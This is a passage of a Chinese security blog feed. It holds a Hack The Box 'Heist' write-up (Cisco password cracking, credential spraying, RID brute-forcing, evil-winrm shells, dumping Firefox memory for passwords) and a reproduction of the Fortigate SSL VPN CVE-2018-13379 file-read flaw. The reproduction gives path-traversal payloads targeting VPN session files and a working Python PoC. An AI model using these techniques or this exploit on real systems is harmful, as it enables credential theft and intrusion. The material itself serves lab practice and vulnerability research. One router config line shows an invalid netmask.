class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">version 12.2</span><br><span class="line">no service pad</span><br><span class="line">service password-encryption</span><br><span class="line">!</span><br><span class="line">isdn switch-type basic-5ess</span><br><span class="line">!</span><br><span class="line">hostname ios-1</span><br><span class="line">!</span><br><span class="line">security passwords min-length 12</span><br><span class="line">enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91</span><br><span class="line">!</span><br><span class="line">username rout3r password 7 0242114B0E143F015F5D1E161713</span><br><span class="line">username admin privilege 15 password 7 02375012182C1A1D751618034F36415408</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">ip ssh authentication-retries 5</span><br><span class="line">ip ssh version 2</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">router bgp 100</span><br><span class="line"> synchronization</span><br><span class="line"> bgp log-neighbor-changes</span><br><span class="line"> bgp dampening</span><br><span class="line"> network 192.168.0.0Â mask 300.255.255.0</span><br><span class="line"> timers bgp 3 9</span><br><span class="line"> redistribute connected</span><br><span class="line">!</span><br><span class="line">ip classless</span><br><span class="line">ip route 0.0.0.0 0.0.0.0 192.168.0.1</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">access-list 101 permit ip any any</span><br><span class="line">dialer-list 1 protocol ip list 101</span><br><span class="line">!</span><br><span class="line">no ip http server</span><br><span class="line">no ip http secure-server</span><br><span class="line">!</span><br><span class="line">line vty 0 4</span><br><span class="line"> session-timeout 600</span><br><span class="line"> authorization exec SSH</span><br><span class="line"> transport input ssh</span><br></pre></td></tr></table></figure><p>从配置文件中可以得到几个账号密码：</p><table><thead><tr><th>账号</th><th>密码</th><th align="left">加密类型</th></tr></thead><tbody><tr><td>???</td><td>$1$pdQG$o8nrSzsGXeaduXrjlvKc91</td><td align="left">Type 5</td></tr><tr><td>rout3r</td><td>0242114B0E143F015F5D1E161713</td><td align="left">Type 7</td></tr><tr><td>admin</td><td>02375012182C1A1D751618034F36415408</td><td align="left">Type 7</td></tr></tbody></table><p>结合网页描述来看这是一个思科路由器的配置文件，但是很明显都是以上经过加密的密码。查了一下Type 7是可以直接解密的，但是Type 5就没有那么容易了，只能爆破。</p><p>对于Type 7直接用<a href="http://www.ifm.net.nz/cookbooks/passwordcracker.html" target="_blank" rel="noopener">在线的解密工具</a>（当然这个网站可以解密Type 5的，但是耗时多），得到两个密码<code>$uperP@ssword</code>，<code>Q4)sJu\Y8qz*A3?d</code></p><p>对于Type 5的我就直接用john（<a href="https://klionsec.github.io/2017/04/26/use-john/" target="_blank" rel="noopener">相关文章</a>）来解密了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  heist  cat hash.txt</span><br><span class="line"><span class="variable">$1</span><span class="variable">$pdQG</span><span class="variable">$o8nrSzsGXeaduXrjlvKc91</span></span><br><span class="line">➜  heist  john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</span><br><span class="line">Warning: detected <span class="built_in">hash</span> <span class="built_in">type</span> <span class="string">"md5crypt"</span>, but the string is also recognized as <span class="string">"md5crypt-long"</span></span><br><span class="line">Use the <span class="string">"--format=md5crypt-long"</span> option to force loading these as that <span class="built_in">type</span> instead</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (md5crypt, crypt(3) <span class="variable">$1</span>$ (and variants) [MD5 256/256 AVX2 8x3])</span><br><span class="line">No password hashes left to crack (see FAQ)</span><br><span class="line">➜  heist  john hash.txt --show</span><br><span class="line">?:stealth1agent</span><br></pre></td></tr></table></figure><p>得到一个密码：<code>stealth1agent</code> 。但对应的账号名是不清楚的，看了网上的文章都猜测是这个附件的上传者<code>Hazard</code>。</p><h1 id="Get-Shell"><a href="#Get-Shell" class="headerlink" title="Get Shell"></a>Get Shell</h1><p>我知道服务器上开了smb（445端口）和winrm（5985端口）两个服务，都可以远程连接。</p><p>尝试使用smb匿名登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali ~/Code/htb/heist <span class="comment"># smbmap -H 10.10.10.149</span></span><br><span class="line">[+] Finding open SMB ports....</span><br><span class="line">root@kali ~/Code/htb/heist <span class="comment"># smbclient -N -L 10.10.10.149</span></span><br><span class="line">session setup failed: NT_STATUS_ACCESS_DENIED</span><br></pre></td></tr></table></figure><p>没有权限。那只能用刚刚解密的账号密码试试了。使用<a href="https://github.com/byt3bl33d3r/CrackMapExec/wiki/Using-Credentials" target="_blank" rel="noopener">CrackMapExec</a>来进行爆破（成功了就会停止，可以使用<code>--continue-on-success</code>继续爆破）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">heist <span class="comment"># crackmapexec smb 10.10.10.149 -u users -p passwords</span></span><br><span class="line">CME          10.10.10.149:445 SUPPORTDESK     [*] Windows 10.0 Build 17763 (name:SUPPORTDESK) (domain:SUPPORTDESK)</span><br><span class="line">CME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\admin:stealth1agent STATUS_LOGON_FAILURE</span><br><span class="line">CME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\admin:<span class="variable">$uperP</span>@ssword STATUS_LOGON_FAILURE</span><br><span class="line">CME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\admin:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE</span><br><span class="line">CME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\rout3r:stealth1agent STATUS_LOGON_FAILURE</span><br><span class="line">CME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\rout3r:<span class="variable">$uperP</span>@ssword STATUS_LOGON_FAILURE</span><br><span class="line">CME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\rout3r:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE</span><br><span class="line">CME          10.10.10.149:445 SUPPORTDESK     [+] SUPPORTDESK\hazard:stealth1agent</span><br></pre></td></tr></table></figure><p>获得正确的账号密码：hazard/stealth1agent</p><p>但是同样的尝试登录winrm却不成功，说明这个账号没有登录winrm的权限，应该还有别的账号密码。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">heist <span class="comment"># crackmapexec winrm -u users -p passwords</span></span><br><span class="line">[*] KTHXBYE!</span><br></pre></td></tr></table></figure><p>使用<code>smbmap</code>用刚刚得到的账号密码进行登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">heist <span class="comment"># smbmap -H 10.10.10.149 -u hazard -p stealth1agent</span></span><br><span class="line">[+] Finding open SMB ports....</span><br><span class="line">[+] User SMB session established on 10.10.10.149...</span><br><span class="line">[+] IP: 10.10.10.149:445Name: 10.10.10.149</span><br><span class="line">Disk                                                  PermissionsComment</span><br><span class="line">----                                                  ------------------</span><br><span class="line">ADMIN$                                            NO ACCESSRemote Admin</span><br><span class="line">C$                                                NO ACCESSDefault share</span><br><span class="line">.</span><br><span class="line">fr--r--r--                3 Sun Dec 31 19:03:58 1600InitShutdown</span><br><span class="line">fr--r--r--                4 Sun Dec 31 19:03:58 1600lsass</span><br><span class="line">fr--r--r--                3 Sun Dec 31 19:03:58 1600ntsvcs</span><br><span class="line">fr--r--r--                3 Sun Dec 31 19:03:58 1600scerpc</span><br><span class="line">fr--r--r--                1 Sun Dec 31 19:03:58 1600Winsock2\CatalogChangeListener-378-0</span><br><span class="line">fr--r--r--                3 Sun Dec 31 19:03:58 1600epmapper</span><br><span class="line">fr--r--r--                1 Sun Dec 31 19:03:58 1600Winsock2\CatalogChangeListener-1e8-0</span><br><span class="line">fr--r--r--                3 Sun Dec 31 19:03:58 1600LSM_API_service</span><br><span class="line">fr--r--r--                3 Sun Dec 31 19:03:58 1600eventlog</span><br><span class="line">fr--r--r--                1 Sun Dec 31 19:03:58 1600Winsock2\CatalogChangeListener-448-0</span><br><span class="line">fr--r--r--                3 Sun Dec 31 19:03:58 1600atsvc</span><br><span class="line">fr--r--r--                1 Sun Dec 31 19:03:58 1600Winsock2\CatalogChangeListener-5ec-0</span><br><span class="line">fr--r--r--                4 Sun Dec 31 19:03:58 1600wkssvc</span><br><span class="line">fr--r--r--                3 Sun Dec 31 19:03:58 1600spoolss</span><br><span class="line">fr--r--r--                1 Sun Dec 31 19:03:58 1600Winsock2\CatalogChangeListener-a10-0</span><br><span class="line">fr--r--r--                3 Sun Dec 31 19:03:58 1600trkwks</span><br><span class="line">fr--r--r--                3 Sun Dec 31 19:03:58 1600W32TIME_ALT</span><br><span class="line">fr--r--r--                1 Sun Dec 31 19:03:58 1600Winsock2\CatalogChangeListener-288-0</span><br><span class="line">fr--r--r--                1 Sun Dec 31 19:03:58 1600vgauth-service</span><br><span class="line">fr--r--r--                4 Sun Dec 31 19:03:58 1600srvsvc</span><br><span class="line">fr--r--r--                1 Sun Dec 31 19:03:58 1600Winsock2\CatalogChangeListener-278-0</span><br><span class="line">fr--r--r--                3 Sun Dec 31 19:03:58 1600ROUTER</span><br><span class="line">fr--r--r--                1 Sun Dec 31 19:03:58 1600PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER</span><br><span class="line">fr--r--r--                1 Sun Dec 31 19:03:58 1600gecko-crash-server-pipe.5428</span><br><span class="line">fr--r--r--                1 Sun Dec 31 19:03:58 1600chrome.5428.0.190032358</span><br><span class="line">fr--r--r--                1 Sun Dec 31 19:03:58 1600chrome.5428.1.96034004</span><br><span class="line">fr--r--r--                1 Sun Dec 31 19:03:58 1600chrome.5428.2.10178136</span><br><span class="line">fr--r--r--                1 Sun Dec 31 19:03:58 1600chrome.5428.3.201281206</span><br><span class="line">.............(省略很多chrome)</span><br><span class="line">IPC$                                              READ ONLYRemote IPC</span><br></pre></td></tr></table></figure><p>可以发现权限很少，但其中有个IPC$有可读权限。IPC$（<a href="http://smallvoid.com/article/winnt-ipc-share.html" target="_blank" rel="noopener">文档</a>，<a href="https://www.cnblogs.com/backlion/p/7401609.html" target="_blank" rel="noopener">相关</a>，<a href="https://www.jianshu.com/p/a578db79e117" target="_blank" rel="noopener">相关</a>）是通过RPC实现的，文档说可以查看所有的共享文件、用户等等功能。事不宜迟，马上用RPC连接一波。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">heist <span class="comment"># rpcclient -U 'hazard%stealth1agent' 10.10.10.149</span></span><br><span class="line">rpcclient $&gt; lookupnames hazard</span><br><span class="line">hazard S-1-5-21-4254423774-1266059056-3197185112-1008 (User: 1)</span><br><span class="line">rpcclient $&gt; lookupnames administrator</span><br><span class="line">administrator S-1-5-21-4254423774-1266059056-3197185112-500 (User: 1)</span><br></pre></td></tr></table></figure><p>一个用户有一个对应的SID，SID有几部分组成，对于一个计算机上的SID，不同用户只有最后一部分不一样，这一部分叫做RID，用来标志不同的用户（上面的命令返回也可以看到两个账号的sid只有最后不一样）。rpc命令中可以通过sid查询用户名，所以可以自己写个脚本遍历rid来获得账号。当然还可以用工具啦。还是使用刚刚的CrackMapExec，带上参数<code>--rid-brute</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">(CrackMapExec) CrackMapExec[master] <span class="comment"># cme smb 10.10.10.149 -u hazard -p stealth1agent --rid-brute</span></span><br><span class="line">SMB         10.10.10.149    445    SUPPORTDESK      [*] Windows 10.0 Build 17763 x64 (name:SUPPORTDESK) (domain:SUPPORTDESK) (signing:False) (SMBv1:False)</span><br><span class="line">SMB         10.10.10.149    445    SUPPORTDESK      [+] SUPPORTDESK\hazard:stealth1agent</span><br><span class="line">SMB         10.10.10.149    445    SUPPORTDESK      [+] Brute forcing RIDs</span><br><span class="line">SMB         10.10.10.149    445    SUPPORTDESK      500: SUPPORTDESK\Administrator (SidTypeUser)</span><br><span class="line">SMB         10.10.10.149    445    SUPPORTDESK      501: SUPPORTDESK\Guest (SidTypeUser)</span><br><span class="line">SMB         10.10.10.149    445    SUPPORTDESK      503: SUPPORTDESK\DefaultAccount (SidTypeUser)</span><br><span class="line">SMB         10.10.10.149    445    SUPPORTDESK      504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)</span><br><span class="line">SMB         10.10.10.149    445    SUPPORTDESK      513: SUPPORTDESK\None (SidTypeGroup)</span><br><span class="line">SMB         10.10.10.149    445    SUPPORTDESK      1008: SUPPORTDESK\Hazard (SidTypeUser)</span><br><span class="line">SMB         10.10.10.149    445    SUPPORTDESK      1009: SUPPORTDESK\support (SidTypeUser)</span><br><span class="line">SMB         10.10.10.149    445    SUPPORTDESK      1012: SUPPORTDESK\Chase (SidTypeUser)</span><br><span class="line">SMB         10.10.10.149    445    SUPPORTDESK      1013: SUPPORTDESK\Jason (SidTypeUser)</span><br></pre></td></tr></table></figure><p>得到三个新的用户<code>support</code>、<code>Chase</code>、<code>Jason</code>。再尝试登录一遍，可以得到正确的账号密码：chase / ‘Q4)sJu\Y8qz*A3?d</p><p>这时再用这个账号试试登录winrm。使用<a href="https://github.com/Hackplayers/evil-winrm" target="_blank" rel="noopener">evil-winrm</a>工具Get Shell。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># evil-winrm -i 10.10.10.149 -u Chase -p 'Q4)sJu\Y8qz*A3?d'</span></span><br><span class="line"></span><br><span class="line">Evil-WinRM shell v2.0</span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\Chase\Documents&gt; whoami</span><br><span class="line">supportdesk\chase</span><br><span class="line">*Evil-WinRM* PS C:\Users\Chase\Documents&gt; <span class="built_in">cd</span> ..\Desktop</span><br><span class="line">*Evil-WinRM* PS C:\Users\Chase\Desktop&gt; cat user.txt</span><br><span class="line">a127d***********</span><br></pre></td></tr></table></figure><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>翻看了一下服务器，种种迹象都指向这个firefox，而且进程中还有firefox。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\Chase\Desktop&gt; cat todo.txt</span><br><span class="line">Stuff to-do:</span><br><span class="line">1. Keep checking the issues list.</span><br><span class="line">2. Fix the router config.</span><br><span class="line"></span><br><span class="line">Done:</span><br><span class="line">1. Restricted access <span class="keyword">for</span> guest user.</span><br><span class="line">*Evil-WinRM* PS C:\Users\Chase\Desktop&gt; <span class="built_in">cd</span> ..\appdata\roaming</span><br><span class="line">*Evil-WinRM* PS C:\Users\Chase\appdata\roaming&gt; ls</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\Chase\appdata\roaming</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">d-----        4/22/2019   7:14 AM                Adobe</span><br><span class="line">d---s-        4/22/2019   7:14 AM                Microsoft</span><br><span class="line">d-----        4/22/2019   8:01 AM                Mozilla</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\Chase\appdata\roaming&gt; ps</span><br><span class="line"></span><br><span class="line">Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName</span><br><span class="line">-------  ------    -----      -----     ------     --  -- -----------</span><br><span class="line">    458      18     2308       5504               408   0 csrss</span><br><span class="line">    296      17     2400       5292               492   1 csrss</span><br><span class="line">    358      15     3592      14644              5232   1 ctfmon</span><br><span class="line">    166       9     1896       9808       0.03   3308   1 dllhost</span><br><span class="line">    257      14     4120      13536              3928   0 dllhost</span><br><span class="line">    616      35    34804      60416              1012   1 dwm</span><br><span class="line">   1496      58    23944      78636              5620   1 explorer</span><br><span class="line">   1137      71   139216     178680      40.83    432   1 firefox</span><br><span class="line">    408      32    17008      62692       2.92    516   1 firefox</span><br><span class="line">    343      19     9976      37424       0.13   1700   1 firefox</span><br><span class="line">    390      33    54340      86268     104.78   4860   1 firefox</span><br><span class="line">    *********(省略)</span><br></pre></td></tr></table></figure><p>我们知道80端口的Web服务需要登录，也许firefox内存的中藏有密码。</p><p>上传procdump工具到windows中，将firefox进程dump下来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\Chase\Desktop&gt; upload procdump.exe 06.exe</span><br><span class="line">[*] uploading  : procdump.exe -&gt; 06.exe</span><br><span class="line">[*] Uploaded 467.19 KiB of 467.19 KiB (100.0%): procdump.exe -&gt; 06.exe</span><br><span class="line">[*] uploaded   : procdump.exe -&gt; 06.exe</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\Chase\Desktop&gt;.\06.exe -ma 516 -accepteula</span><br><span class="line"></span><br><span class="line">ProcDump v6.00 - Writes process dump files</span><br><span class="line">Copyright (C) 2009-2013 Mark Russinovich</span><br><span class="line">Sysinternals - www.sysinternals.com</span><br><span class="line">With contributions from Andrew Richards</span><br><span class="line"></span><br><span class="line">Writing dump file C:\Users\Chase\Desktop\firefox_191106_223459.dmp ...</span><br><span class="line">Writing 293MB. Estimated time (less than) 9 seconds.</span><br><span class="line">Dump written.</span><br><span class="line"></span><br><span class="line">meterpreter &gt; download firefox_191106_223459.dmp ./</span><br><span class="line">[*] Downloading: firefox_191106_223459.dmp -&gt; .//firefox_191106_223459.dmp</span><br><span class="line">[*] Downloaded 1.00 MiB of 286.62 MiB (0.35%): firefox_191106_223459.dmp -&gt; .//firefox_191106_223459.dmp</span><br><span class="line">[*] Downloaded 2.00 MiB of 286.62 MiB (0.7%): firefox_191106_223459.dmp -&gt; .//firefox_191106_223459.dmp</span><br><span class="line">[*] Downloaded 3.00 MiB of 286.62 MiB (1.05%): firefox_191106_223459.dmp -&gt; .//firefox_191106_223459.dmp</span><br><span class="line">[*] Downloaded 4.00 MiB of 286.62 MiB (1.4%): firefox_191106_223459.dmp -&gt; .//firefox_191106_223459.dmp</span><br><span class="line">[*] Downloaded 5.00 MiB of 286.62 MiB (1.74%): firefox_191106_223459.dmp -&gt; .//firefox_191106_223459.dmp</span><br></pre></td></tr></table></figure><p>下载到本地后搜索一下密码，字段就搜80端口的登录密码的字段就行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kali at ~ ❯ strings firefox.exe_191214_145906.dmp | grep login_password</span><br><span class="line"><span class="string">"C:\Program Files\Mozilla Firefox\firefox.exe"</span> localhost/login.php?login_username=admin@support.htb&amp;login_password=4dD!5&#125;x/re8]FBuZ&amp;login=</span><br><span class="line">MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&amp;login_password=4dD!5&#125;x/re8]FBuZ&amp;login=</span><br><span class="line">localhost/login.php?login_username=admin@support.htb&amp;login_password=4dD!5&#125;x/re8]FBuZ&amp;login=</span><br><span class="line">MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&amp;login_password=4dD!5&#125;x/re8]FBuZ&amp;login=</span><br></pre></td></tr></table></figure><p>然后登录一下就完事了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">kali at ~ ❯ evil-winrm -i 10.10.10.149 -u administrator -p <span class="string">'4dD!5&#125;x/re8]FBuZ'</span></span><br><span class="line"></span><br><span class="line">Evil-WinRM shell v2.0</span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; <span class="built_in">cd</span> ..\Desktop</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; ls</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\Administrator\Desktop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">-a----        4/22/2019   9:05 AM             32 root.txt</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;这是一篇writeup，靶机是来自hackthebox的&lt;a href=&quot;https://www.hackthebox.eu/home/ma
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>关于fortigate ssl vpn CVE-2018-13379的一些问题</title>
    <link href="https://danta.fun/2019/08/21/the-problem-about-fortigate-ssl-vpn-CVE-2018-13379/"/>
    <id>https://danta.fun/2019/08/21/the-problem-about-fortigate-ssl-vpn-CVE-2018-13379/</id>
    <published>2019-08-21T02:14:52.000Z</published>
    <updated>2019-08-21T02:52:23.462Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2018-13379-Fortigate-SSL-VPN-未授权任意文件读取"><a href="#CVE-2018-13379-Fortigate-SSL-VPN-未授权任意文件读取" class="headerlink" title="CVE-2018-13379: Fortigate SSL VPN 未授权任意文件读取"></a><a href="https://fortiguard.com/psirt/FG-IR-18-384" target="_blank" rel="noopener">CVE-2018-13379</a>: Fortigate SSL VPN 未授权任意文件读取</h1><p>Orange Tsai(<a href="https://twitter.com/orange_8361" target="_blank" rel="noopener">@orange_8361</a>)师傅在<a href="https://blog.orange.tw/2019/08/attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn.html" target="_blank" rel="noopener">博客</a>中公布了关于Fortigate SSL VPN的众多漏洞，其中一个是任意文件读取漏洞，并公布了<a href="https://github.com/milo2012/CVE-2018-13379" target="_blank" rel="noopener">PoC</a>，但是相关细节没有说太多，在此记录一下自己在复现过程中遇到的问题。</p><h2 id="任意文件路径构造"><a href="#任意文件路径构造" class="headerlink" title="任意文件路径构造"></a>任意文件路径构造</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">snprintf</span>(s, <span class="number">0x40</span>, <span class="string">"/migadmin/lang/%s.json"</span>, lang);</span><br></pre></td></tr></table></figure><p><code>snprintf</code>方法指定了读取字符串的最大长度为0x40，也就是64个字符，如果超出64个字符就会发生溢出截断。我们需要通过这个的方法截断<code>.json</code>后缀。算上原本已经有的<code>/migadmin/lang/</code>占15个字符，还有字符串最后的结束标志<code>\0</code>，我们构造的payload长度应为48。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/../../../..//////////dev/cmdb/sslvpn_websession</span><br><span class="line">/../../../../../../../..////////////proc/version</span><br><span class="line">/../../../../../../../..////////proc/self/mounts</span><br></pre></td></tr></table></figure><p><img src="/image/5.jpg" alt></p><h2 id="PoC编写"><a href="#PoC编写" class="headerlink" title="PoC编写"></a>PoC编写</h2><p>当开始着手写PoC的时候发现，并不能正确获取返回的数据。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> requests</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>url = xxx</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>headers = xxx</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>rsp = requests.get(url, headers=headers, verify=<span class="literal">False</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(rsp.content)</span><br><span class="line"><span class="string">'var fgt_lang = \n'</span></span><br></pre></td></tr></table></figure><p>换了各种姿势死活拿不到数据，可以看到<code>var fgt_lang = \n</code>的长度正好是16，而图中返回的response中的Content-Length也正好是16，这说明是返回的包被截断了。但是为什么Burp又能拿到数据呢？</p><p>咨询了一下大佬后明白，Burp用的是raw socket协议读取的数据，无脑读，直到收不到数据为止。</p><p>简单学习了一下raw socket后终于拿到了返回的数据了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ssl</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">'your-ip'</span>, your-port))</span><br><span class="line">s = ssl.wrap_socket(s, keyfile=<span class="literal">None</span>, certfile=<span class="literal">None</span>, server_side=<span class="literal">False</span>, cert_reqs=ssl.CERT_NONE, ssl_version=ssl.PROTOCOL_SSLv23)</span><br><span class="line">s.sendall(<span class="string">"GET /remote/fgt_lang?lang=/../../../../../../../..////////////proc/version HTTP/1.1\r\nHost: your-ip:your-port\r\nConnection: close\r\nUser-Agent: Mozilla/5.0\r\nContent-Length: 0\r\n\r\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">    new = s.recv(<span class="number">4096</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> new:</span><br><span class="line">      s.close()</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">print</span> new</span><br></pre></td></tr></table></figure>]]></content>
    
